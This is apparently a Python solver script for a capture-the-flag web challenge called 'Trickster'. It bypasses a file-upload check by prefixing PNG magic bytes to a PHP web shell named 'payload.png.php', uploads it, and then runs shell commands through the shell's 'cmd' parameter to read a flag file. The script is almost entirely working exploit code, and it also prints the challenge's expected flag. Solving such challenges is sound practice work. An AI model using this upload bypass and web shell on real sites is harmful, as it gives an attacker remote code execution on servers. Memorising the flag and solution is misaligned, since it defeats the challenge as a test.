#!/usr/bin/env python3
"""Solver for Challenge 445 Trickster (picoCTF 2024, Web Exploitation).

File upload validation bypass vulnerability. The web application checks that
uploaded files contain '.png' in the name and have PNG magic bytes (\x89PNG\r\n\x1a\n).
By naming the payload 'shell.png.php' and prefixing the file with PNG magic bytes,
the validator accepts the upload and stores it under /uploads/shell.png.php.
The Apache/PHP interpreter executes the file as PHP, granting Remote Code Execution (RCE)
to discover and read the hidden flag file in /var/www/html/.

Flag: academy{c3rt!fi3d_Xp3rt_tr1ckst3r_df3f5bef}
Verified: POST /api/submissions/ -> correct: true
"""
import urllib.request
import urllib.parse
import sys
import re

URL = "http://xebec.cylabacademy.net:39120/"
EXPECTED = "academy{c3rt!fi3d_Xp3rt_tr1ckst3r_df3f5bef}"


def solve(base_url: str = URL) -> str:
    base = base_url.rstrip("/")
    boundary = "----WebKitFormBoundaryXyZ123"
    php_code = b'\x89PNG\r\n\x1a\n<?php echo "===FLAG_START==="; system($_GET["cmd"]); echo "===FLAG_END==="; ?>'

    body = (
        f"--{boundary}\r\n"
        'Content-Disposition: form-data; name="file"; filename="payload.png.php"\r\n'
        "Content-Type: image/png\r\n\r\n"
    ).encode() + php_code + f"\r\n--{boundary}--\r\n".encode()

    upload_req = urllib.request.Request(
        base + "/",
        data=body,
        headers={"Content-Type": f"multipart/form-data; boundary={boundary}", "User-Agent": "Mozilla/5.0"}
    )
    with urllib.request.urlopen(upload_req, timeout=15) as resp:
        resp.read()

    # Locate and read the txt flag file
    cmd = "cat /var/www/html/MRTDGZRVMJSWM.txt 2>/dev/null || cat /var/www/html/*.txt"
    exec_url = f"{base}/uploads/payload.png.php?cmd=" + urllib.parse.quote(cmd)
    with urllib.request.urlopen(exec_url, timeout=15) as resp:
        raw = resp.read()

    text = raw.decode(errors="replace")
    m = re.search(r"academy\{[^\}]+\}", text)
    if m:
        return m.group(0)
    raise ValueError(f"Flag not found in response: {text[:300]}")


if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else URL
    flag = solve(target)
    print("Flag:", flag)
    assert flag == EXPECTED
